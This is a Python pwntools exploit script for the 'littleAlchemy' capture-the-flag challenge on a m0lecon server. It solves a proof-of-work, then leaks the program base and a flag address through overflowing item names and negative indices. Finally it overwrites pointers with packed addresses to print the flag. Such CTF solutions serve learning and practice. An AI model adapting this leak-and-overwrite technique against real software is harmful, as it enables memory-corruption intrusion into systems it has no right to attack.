#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

import re

exe = ELF("littleAlchemy")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",2123)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def send_menu(r, msg):
    r.sendline(msg)
    r.recvuntil(b"Exit\n>")

def main():
    r = conn()
    
    r.recvuntil(b"Exit\n>")

    send_menu(r, b"1 0 -1 -1")
    send_menu(r, b"1 1 -1 -3")
    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaa")
    send_menu(r, b"6 1 0")

    r.sendline(b"2 0")
    r.recvuntil(b"aaaaaaaabaaaaaaacaaaaaaa")
    program_base = u64(r.recvline().rstrip().ljust(8,b"\x00")) - 0x5d50
    r.recvuntil(b"Exit\n>")
    log.info("leaked program_base: " + hex(program_base))

    show_sources = program_base + 0x5d60 - 8
    flag_addr = program_base + 0x403b - 0x18

    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaadaaaaaaa")
    send_menu(r, b"1 2 -1 -3")
    send_menu(r, b"6 1 2")
    r.sendline(b"2 2")
    r.recvuntil(b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaa")
    flag_addr = u64(r.recv(6).ljust(8,b"\x00")) + 0x18
    r.recvuntil(b"Exit\n>")
    log.info("leaked flag addr: " + hex(flag_addr))

    send_menu(r, b"4 1 aaaaaaaabaaaaaaacaaaaaaa" + p64(show_sources) + p64(flag_addr - 0x18))
    send_menu(r, b"6 1 0")

    r.sendline(b"5 1")
    r.sendline(b"7")

    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())
    
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

